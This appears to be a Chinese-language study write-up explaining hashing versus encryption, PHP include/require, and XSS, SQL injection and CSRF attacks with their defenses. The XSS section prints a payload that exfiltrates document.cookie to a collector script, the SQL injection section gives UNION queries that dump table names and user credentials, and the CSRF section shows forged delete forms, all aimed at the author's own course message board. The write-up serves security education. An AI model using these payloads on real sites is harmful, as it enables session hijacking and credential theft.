## 請說明雜湊跟加密的差別在哪裡，為什麼密碼要雜湊過後才存入資料庫

在密碼學裡有所謂的編碼（ Encode ）、加密（ Encrypt ）跟雜湊（ Hash ），他們有甚麼不一樣呢？

### 編碼（ Encode ）

#### 摩斯密碼


摩斯密碼最早是山謬·摩斯發明的（ Sammuel Morse ），他一開始的構想的利用特殊密碼本或字典來加密訊息，**目的不是要隱藏內容，而是要讓訊息發送更簡便迅速**。而我們現在熟知的摩斯電碼是經過佛里德克希·克烈門斯·格爾克（ Friedrich Clemens Gerke ）改良，以簡短的點與底線來把最常用的字母代碼縮短。

![imgur](https://i.imgur.com/4mOLQh4.jpg) 

假如今天收到一份摩斯密碼`.... ..`，那你可以很快翻譯出來是`HI`

#### htmlspecialchars

html 裡設計了一些特殊符號的編碼來防範 xss 的攻擊，舉例來說，下面這一段程式碼

```php
<?php
echo '<a href=\"#\">Test Link</a>';
echo '<br>';
$Str = htmlspecialchars("<a href=\"#\">Test Link</a>",ENT_QUOTES);
echo $Str;
?>
```
最後會輸出這樣的結果


[Test Link](#)
`<a href="#">Test Link</a>`

如果檢查網頁原始碼，可以發現是這樣子的

<a href=\"#\">Test Link</a><br>&lt;a href=&quot;#&quot;&gt;Test Link&lt;/a&gt;

htmlspecialchars 會將敏感的字元像是`>`、`<`以及單雙引號等加以編碼，html 看到這些編碼就知道是**僅供閱讀**的符號。（ 這個例子裡雙引號使用`\`跳脫所以沒有被編碼 ）

#### 霍夫曼編碼

霍夫曼編碼（ Huffman Coding ）是一種用來進行**無失真壓縮**的編碼演算法，原理是把常用的字記成縮寫，所以可以達到壓縮資料量讓傳輸更快的效果。

總結一下甚麼是編碼，從上面的例子不難看出**編碼沒有安全性可言**，但他可以達到**省時**、**跳脫** 等等的效果。

### 加密（ Encrypt ）

加密跟編碼有一點相似，不過就算知道了使用甚麼加密法，還需要有**金鑰（ key ）**才可以解碼。 

#### 密碼棒

史書裡最早記載的**換位式密碼**使用「密碼棒」（ scytale ），一組密碼棒包含兩根圓木棒，尺寸要一模一樣。送訊息時，送信者把一條長長的羊皮紙緊緊纏繞在木棍上，然後沿著木棒的長軸寫下訊息，這樣一來打開信紙有一串不相干的字，只有另一個擁有密碼棒的人將羊皮紙纏上才能讀取內容。

![img](https://i.imgur.com/BVuSmS5.jpg)

#### AES

AES（ Advanced Encryption Standard ）也是一種**對稱式加密法**，也就是說**加密者與解密者都使用同一把金鑰**，AES 可能的金鑰數量達到 10 的 38 次方的數量級，所以安全性相當的高。但是對稱性加密法都有共通的問題，如果在**雙方交換金鑰的時候被攔截**，那不管是多安全的對稱式加密法都會破功。而 HTTPS 協定就是根據這個漏洞去做了改良。

#### 非對稱加密法

非對稱加密法可以產生一組公鑰（ Public Key ）跟私鑰（ Private Key ），用**公鑰加密的內容只能用私鑰解開**。

假設我要傳訊息給 A，A 生成一組公鑰跟私鑰，並將公鑰傳給我。我把鑰傳遞的訊息用這把公鑰加密以後，再傳給 A，這時候 A 用私鑰解開訊息內容就可以了。**就算有中間人攔截到了公鑰以及被公鑰加密的訊息，也無法解碼。** 如果有興趣瞭解可以搜尋著名的非對稱式加密法`RSA`。

### 雜湊（ Hashing ）

#### 身分證字號

台灣的身分證的最後一碼是透過雜湊函式來給定的，算法像下面這樣

![img](https://i.imgur.com/Z9K1DBg.png)

所以 F123456789 並不是一組合法的身分證字號，F123456784 才是。

雜湊函式厲害的地方在於**就算你知道算法也推不回去**，像身份證字號的案例可以寫成 10- (A + 9B + 8C + 7D + 6E + 5F + 4G + 3H + 2I + J)%10 = ANSWER ，這麼多變數要怎麼推阿，10 個變數至少要 10 條方程式才可以找到唯一解，像這種情況只能慢慢湊。

雜湊函式可能會遇到**碰撞**的問題，也就是可能會有超過一組答案對應到同一個解，至於為甚麼這會是個問題，等等會談到雜湊函式的用途。

#### 驗證檔案是否被竄改

在使用 bootstrap 或 jquery 這些第三方 library 時，官方都會提供一個 integrity 屬性，這個屬性是程式碼經過 SHA-2 演算法雜湊的結果，如果你下載的跟官方的 integrity 值不一樣，那檔案就跟官方的不同。

#### 儲存使用者密碼

後端在儲存使用者密碼的時候，通常只會儲存雜湊後的密碼，這樣一來即使後端被駭也可以保障使用者的密碼不外洩。不過如果有兩組密碼經過雜湊後的值相同，也就是所謂的碰撞，這樣一來這兩組密碼都可以登入同一個使用者，所以選擇雜湊函式時碰撞的機率就是一個很重要的指標了。

#### 加鹽

雖然駭客沒辦法破解雜湊後的密碼，但駭客自己建立起一個**常用字串對照雜湊值**的表格，網路上還真的有整理一張[彩虹表](https://ophcrack.sourceforge.io/)，裡面有許多常用的組合跟對應的雜湊值。

但其實是可以防範的，我們只要**給密碼加鹽**就可以了。

假設我的密碼原本是 123，後台會自動在密碼後綴 abc，所以後端儲存的密碼是 123abc 雜湊的結果，除非駭客知道加鹽的內容，否則沒辦法靠彩虹表查表。

## `include`、`require`、`include_once`、`require_once` 的差別

include, require, include_once, 還有 require_once 這幾個 statement 都有在 php 檔裡插入另一支 php 程式碼的功能，但他們又有些許的不同。

首先 require_once 以及 include_once 的 php 檔都**只能被插入一次**，就是它字面上的意思。

再來比較 require 以及 include 的差別。require 產生的錯誤會**強制停止程式**，但 include 產生的錯誤**只會生成警告**，程式會繼續執行。

### 使用時機

基於 require 與 include 對錯誤處理的不同，如果無論如何都想讓使用者看到一些內容，那通常會使用 include，但是在大多數的情況下，使用 require 去引入重要的函數或重複使用的模組可以提高整個程式的安全性與完整性。

打個比方，假設要引入檢查登入的功能，那最好使用 require，如果檔案意外遺失，至少會直接報錯而不會顯示後續的資料。

##  請說明 XSS 的攻擊原理以及防範方法

XSS 的全名是 Cross Site Scripting，這件事看起來其實還好，因為我們本來就可自己在網站上自己寫一些 Javascript 來操作。

但可怕的是如果網站被預先植入惡意的 javascript 程式碼呢？ 當我們一載入網站就執行了惡意的 javscript 程式碼，比如說如果**一載入網站就自動把 cookie 送給別的 sever**。

這邊可以示範這樣的攻擊手段。

**攻擊方** localhost
**受害方** mentor-program.co

先在本機開啟 apache 伺服器然後寫下這樣子的檔案 get_cookie.php

```
<?php
$cookie = $_GET['cookie'];
$ip = getenv ('REMOTE_ADDR');
$time = date('Y-m-d g:i:s');
$fp = fopen("cookie.txt","a");
fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
fclose($fp);
?>
```
這個 php 檔會自動把拿到的 cookie 還有其他資訊寫進 cookie.txt 裡。

接著手動開啟 cookie.txt 並開權限，在同個資料夾下終端機輸入

```
touch cookie.txt
chmod 777 cookie.txt
```
接著我們來看看受害的目標網站

![img](https://i.imgur.com/iz6i15U.jpg)

這是一個留言板，它的原理是會把留言的內容寫入後端，每次前端的呈現都會再把後端的留言挖出來，所以我們可以利用著個漏洞植入惡意的程式碼。 在這邊故意留一個 `<script>document.write('<img src="http://localhost/boching/get_cookie.php?cookie='+document.cookie+'" width=0 height=0 >')</script>` 的留言。

重新載入留言板後，發現沒什麼異狀，但打開 devtool 卻發現無意間送出了 http/localhost/boching/get_cookie.php?cookie=xxx 的請求。

![img](https://i.imgur.com/rnH4Pub.jpg)

看了網頁的原始碼原來是因為網頁原本要把 card__content 的內容解析成純文字，卻誤把把留言解析成 script 標籤，因此發出請求想拿到圖片。

![img](https://i.imgur.com/eQxqao8.jpg)

回頭看我們的 cookie.txt，的確是拿到了想要的資訊。 當然駭客再進行這樣的操作不會使用 localhost，而會使用 DNS 可以搜尋到的 domain。

![img](https://i.imgur.com/SDxWi9m.jpg)

如果想知道 cookie 被拿走會有甚麼後果，可以參考[這裡](https://lidemy5thwbc.coderbridge.io/2021/06/15/mysql-cookie/)。

### 防範方法

問題的根本在於瀏覽器對於 html 的解析是以 tag 為優先，所以出現 `<` 的時候會先解析成標籤，幸好瀏覽器提供了一些跳脫字元，這邊稍微列舉一下。

* &amp; → & 
* &lt; → < 
* &gt; → > 
* &quot; → " 
* &apos; → ' 

當後端提取留言時，把這些敏感符號進行轉換，當瀏覽器看到這些代碼就可以正確的解析成純文字。在 php 可以使用 [htmlspecialchars](https://www.php.net/manual/en/function.htmlspecialchars.php) 函式來跳脫。

## 請說明 SQL Injection 的攻擊原理以及防範方法

用處理完 html 特殊字元的跳脫之後，以為可以高枕無憂了，沒想到還存在著別的漏洞，這個漏洞的會遭受 SQL injection 的攻擊，這個攻擊的目的是去竄改 SQL 的語法。

我們還是拿留言板來當作示範，我們來看看修改留言的部分。

![img](https://i.imgur.com/VoZG8I2.png)

我們猜測應該存在這樣的原始碼 `SELECT content FROM table WHERE id=`.`$_GET['id']`，意思是透過從網址取得的 id 去資料庫裡撈留言出來。

![img](https://i.imgur.com/IdxoPqD.png)

漏洞就出在 `$_GET['id']` 的部分是可以讓使用者自行輸入的，如果駭客輸入了 SQL 的語法就有機會竄改原意。

這邊示範怎麼把使用這的帳密都撈出來，這邊可以使用 union 的語法，union 語法可以合併前後撈出來的資料，但前提是前後的 column 要相同。

剛剛我們猜測原始碼的語法是 `SELECT content FROM XXX WHERE id=`.`$_GET['id']`，也就是挑出了一筆資料。

首先我們要找出哪個表格有我們想要的帳號以及密碼，所以我們想創造這樣的 SQL 語法：`SELECT content FROM XXX WHERE id=-99999 union SELECT TABLE_NAME FROM information_schema.tables`。information 資料庫底下的 tables 表格裡紀錄了所有 table 的資訊，而 TABLE_NAME 這個欄位提供了所有表格的名稱。

所以我們把網址這樣寫 `
http://mentor-program.co/mtr04group3/Wangpoching/comment_board/update_comment.php?id=-99999 union SELECT TABLE_NAME FROM information_schema.tables`，沒想到卻沒有跑出任何東西。首先猜測原始碼可能撈了不只一筆資料，所以我們打開 devtool 找找看有沒有甚麼遺漏的。

![img](https://i.imgur.com/SePT7nO.png)

沒想到這個頁面除了有留言內容，還隱藏了 id 的資訊，所以其實原始碼的部分挑出了兩個欄位，所以可以試圖把 SQL 改寫成 `SELECT id, content FROM XXX WHERE id=-99999 union SELECT 1, TABLE_NAME FROM information_schema.tables`，再度修改網址以後終於成功了。

![img](https://i.imgur.com/YUvwEmx.jpg)

雖然版面很醜，但是去 devtool 還是可以看到內容。

![imgur](https://i.imgur.com/TZHsIFA.jpg)

然後我們找到了 `boching_board_comment_users`，找到了以後我們只要印出帳號密碼就完成了，把 SQL 改成 `SELECT id, content FROM XXX WHERE id=-99999 union SELECT 1, concat(username, password) FROM boching_board_comment_users`。

![img](https://i.imgur.com/7gefqE4.jpg)

最後成功拿到了所有使用者的帳密，但密碼是經過雜湊的，接著就看駭客能不能破解密碼了呢！

### 防禦方法

實際攻破防線以後，讓我們回到經營者的角度，思考怎麼去防範。回想一下漏洞出在原始碼用**字串拼接**的方式去生成 SQL 語句，如果我們可以使用`template`的形式，先寫出架構，而要填入的內容只被當作純文字看待，這和防範 XSS 的攻擊有異曲同工之妙。

```
  <?php
    $sql = 'SELECT id, content FROM boching_board_comments WHERE id=?';
    $stmt = $conn->prepare($sql);
    $stmt->bind_param('i', $id);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($result->num_rows === 1) {
      $row = $result->fetch_assoc();
    } else {
      header('Location:index.php');
      die('查無留言');
    }
```

上面的程式碼利用 prepare 函式先寫模板，接著再用 bind_param 填入變數，這個時候變數不管是甚麼都只會被當成是純字串，所以駭客就沒辦法竄改 SQL 語句了。

## 請說明 CSRF 的攻擊原理以及防範方法

### CSRF 的攻擊手段

即使防禦好了 xss 以及 SQL injection 的威脅，其實還存在著另外的隱憂，一樣拿留言板當被攻擊的案例。

在留言板的功能裡有刪除留言的功能，後端會檢查欲刪除的留言 id 是否是本人發出的，像下面這一張圖，如果 Peter 想刪掉自己的留言是可行的，請求的網址是 `http://mentor-program.co/mtr04group3/Wangpoching/comment_board/delete_comment.php?id=63` 可以看到這是以 get 實作的刪除功能。

![img](https://i.imgur.com/ZK4gjfv.png)

好了，現在問題來了，如果有一天，因為有惡質朋友知道 Peter 喜歡制服少女，所以傳了一個網站：

```
<a href='http://mentor-program.co/mtr04group3/Wangpoching/comment_board/delete_comment.php?id=63'>點擊觀看制服美少女</a>
```
在 Peter 已經登入的情況下，基於瀏覽器會帶上訪問 domain 的 cookie，所以 Peter 的身分驗證就會通過，然後確認留言 id 是 Peter 的後，刪除就成功了。

讓我們一步一步把防範方法優化，首先因為我們知道這樣的攻擊手段在於使用者不知情的狀況下送出請求，那**如果用 POST 的形式就沒問題了吧**？因為使用者應該不會在奇怪的網站上填上自己的留言 id。

但如果惡質的朋友傳給你的網站是這麼寫的呢？

```
<form action="http://mentor-program.co/mtr04group3/Wangpoching/comment_board/delete_comment.php" method="POST">
  <input type="hidden" name="id" value="3"/>
  <input type="submit" value="點擊觀看制服美女"/>
</form>
```
Peter 又不明不白的點下按鈕把自己的留言刪掉了。

不然把**後端改成只處理 json 格式的資料呢?**，php 有 json.decode() 函式可以使用，不過你那壞朋友還是有辦法，因為在 form 裡面有 `text/plain` 的選項。

```
<form action="http://mentor-program.co/mtr04group3/Wangpoching/comment_board/delete_comment.php" enctype="text/plain">
  <input type="hidden" name="id" value="3"/>
  <input type="submit" value="點擊觀看制服美女"/>
</form>
```

於是 Peter 又成功刪除了自己的留言。

更可怕的是其實只要壞朋友只要寫在網頁上用 JAVA script 寫 XHR ，就算 server 端用同源政策來防禦，因為 GET, POST 屬於簡單請求，所以刪除還是會被執行。

#### 簡單請求和預檢請求

基於安全性考量，**程式碼所發出**的跨來源 HTTP 請求會受到限制。例如，XMLHttpRequest 及 Fetch 都遵守同源政策（same-origin policy）。這代表網路應用程式所使用的 API **除非使用 CORS 標頭，否則只能請求與應用程式相同網域的 HTTP 資源**。

這邊可以注意到像是 img，iframe，form, script 等標籤是不受同源政策規範的。如果不符合同源政策，雖然**請求還是會發出，但瀏覽器會擋掉回應不讓程式拿到**，要注意的是，請求還是會發出，所以如果是希望 server 做刪除、新增等等的功能，還是無法預防。

為了防止這樣的情形，同源政策區分了簡單請求和預檢請求。預檢（ preflighted ）請求會先以 HTTP 的 OPTIONS 方法送出請求到另一個網域，確認後續實際（actual）請求是否可安全送出，這樣可以預防 server 在後端做不該做的操作。

簡單請求滿足以下所有條件：

* 僅允許下列 HTTP 方法：
  * GET
  * HEAD (en-US)
  * POST
* 除了 user agent 自動設定的標頭（例如 Connection、User-Agent，或是任何請求規範［Fetch spec］中定義的「禁止使用的標頭名稱［forbidden header name］」中的標頭）之外，僅可手動設定這些於請求規格（Fetch spec）中定義為「CORS 安全列表請求標頭（CORS-safelisted request-header）」的標頭，它們為：
  * Accept
  * Accept-Language (en-US)
  * Content-Language (en-US)
  * Content-Type（但請注意下方的額外要求）
  * Last-Event-ID
  * DPR
  * Save-Data
  * Viewport-Width
  * Width
* 僅允許以下 Content-Type 標頭值：
  * application/x-www-form-urlencoded
  * multipart/form-data
  * text/plain
* 沒有事件監聽器被註冊到任何用來發出請求的 XMLHttpRequestUpload 物件（經由 XMLHttpRequest.upload (en-US) 屬性取得）上。
* 請求中沒有 ReadableStream (en-US) 物件被用於上傳。

#### 防禦 CSRF 的方法

##### 我是使用者

很簡單，如果你是使用者，那就記得每次登入完最好勤勞的登出，因為登出以後身分驗證就會失效，第三方網站就沒辦法假扮你了。

##### 我是 server 端

server 端也有一些積極的方法可以對付 CSRF，首先思考 CSRF 攻擊的原理，也就是從**第三方發送的假冒請求**。如果可以區分是不是第三方網站發出的請求，就可以成功抵禦。

* 檢查 Referer

這個方法很直接，可以檢查 request 的 referer header ，但是我們難以確保瀏覽器會帶上 referer，因為使用者可以手動關閉或是有些瀏覽器不支援這個 header。

* 多重驗證

在重要的功能再加上手機驗證或圖形驗證的功能，因為攻擊方並不知道答案，所以可以有效的防禦。這個方法的安全性很高，但只適合在重要的功能使用，不然使用者體驗會很差。

* 加上 CSRF token

這個方法的核心在於紀錄 server 的 state。 為了示範這個方法，在留言板的刪除功能新增了這個功能，跟一開始一樣，Peter 想刪掉自己的留言。不過這次點擊垃圾桶符號並不會直接比對身分後刪除留言，而是會進入一個確認刪除的畫面。

![img](https://i.imgur.com/cXimHQv.png)

這個畫面裡其實偷偷藏了一個 csrf-token，在 server 端把這個 csrf-token 跟驗證身分的 session 放在一起，如此一來，Peter 便有了兩組通行碼，一個是登入的時候存的通行碼，新的是授權刪除文章的通行碼。

![img](https://i.imgur.com/C18idd7.png)

![img](https://i.imgur.com/7HDV2LT.png)

確認刪除按鈕按下以後，server 比對送來的 csrf-token 和 session 裡存的一致，才會通過。也就是說，如此一來瀏覽器可以確認使用者有點擊確認刪除才執行刪除的工作，不是從莫名其妙的地方進行刪除的請求。

* Double Submit Cookie

上一種解法需要 server 的 state，才能驗證正確性。 然而 csrf-token 並不一定要儲存在 server 端，一樣在確認刪除的頁面產生一組隨機的 token 並且加在 form 上面，**同時也讓 client side 設定一個名叫 csrftoken 的 cookie，值也是同一組 token**。 這個方法也可行的原因在於因為瀏覽器的限制，攻擊者並不能在自己的 domain 設定 mentor-program.co 的 cookie！所以就算攻擊者也創造了一個隱藏的表單，裡面隨便寫上一組 crsf-token。但是因為攻擊者無法透過 javascript 去新增或是修改 mentor-program.co 的 cookie，所以當 server 檢查名叫 csrf-token 的 cookie 時便找不到。

* browser 本身的防禦

最後來談到瀏覽器本身對 csrf 的防禦，Chrome 80 後針對第三方 Cookie 的規則調整。 

第三方 cookie 常用在廣告追蹤，假設購物平台與留言板合作，留言板會從購物平台以 img 標籤獲取圖片，img 標籤是不受同源限制的規範的，跨站的 set-cookie 以及攜帶 cookie 也不受限制。所以假設當獲取購物平台的圖片時，購物平台請求設置一個 cookie，當之後使用者瀏覽購物平台時就會攜帶這個 cookie，購物平台便會投放跟留言板相關的產品。

程式碼發出的請求受到同源政策的規範，而 set-cookie 以及攜帶 cookie 則防範則更嚴格，需要在 server 端與 client 端設定更多參數，有興趣可以參考[這裡](https://developer.mozilla.org/zh-TW/docs/Web/HTTP/CORS)。

說了這麼多，回到 Chrome 80 後針對第三方 Cookie 的規則調整，在 http header 的 set-cookie 後綴新增了 **samesite** 的參數。 SameSite 有三個選項 None, Strict 以及 Lax。

* SameSite=None

無論是 same-site 還是 cross-site 的 request 上， 都可以帶有該 cookie。所以在這個情況下，第三方 cookie 廣告追蹤的功能是允許的。

* SameSite=Strict

僅限 same-site request 才能夠帶有此 cookie。

* SameSite=Lax

全部的 same-site request 以及部分 cross-site request 能夠寫入 cookie。這裡的部分包含以下能送出 request 的網頁元件：`<a>`, `<link rel="prerender">`, `<form method="GET">.`。

這邊的規則十分有趣，為甚麼有些標籤可以跨網域，有些不行，其實只要把握一個大原則，如果**網頁會跳轉**，就可以設置還有攜帶 cookie，原因是因為如果網頁會跳轉，使用者在遭到 csrf 攻擊的時候比較能有所察覺，但網頁部會跳轉的話會讓受害者怎麼死的都不知道。

最後來測試一下 Lax cookie 的實作，在留言版首頁的程式碼裡加上 `header("Set-Cookie: test=abc; path=/; domain=mentor-program.co; HttpOnly; SameSite=Lax");` ，然後在 localhost 寫一支 testcookie.html 
```
<a href="http://mentor-program.co/mtr04group3/Wangpoching/comment_board/index.php">click me</a>
<img src="http://mentor-program.co/mtr04group3/Wangpoching/comment_board/index.php">
```
在預載入圖片的請求中，可以看到 set-cookie 被阻擋了下來。

![img](https://i.imgur.com/bPDLKqv.png)

當我們點擊超連結進入留言板，這次成功 set-cookie。

![img](https://i.imgur.com/cLw0mDd.png)

再次刷新 testcookie.html，一樣會先預載入圖片，從 request header 看出沒有攜帶 cookie。

![img](https://i.imgur.com/jomWaj1.png)

當我們點擊超連結進入留言板，這次攜帶了 test=abc 的 cookie。

![img](https://i.imgur.com/TB9PMFW.png)

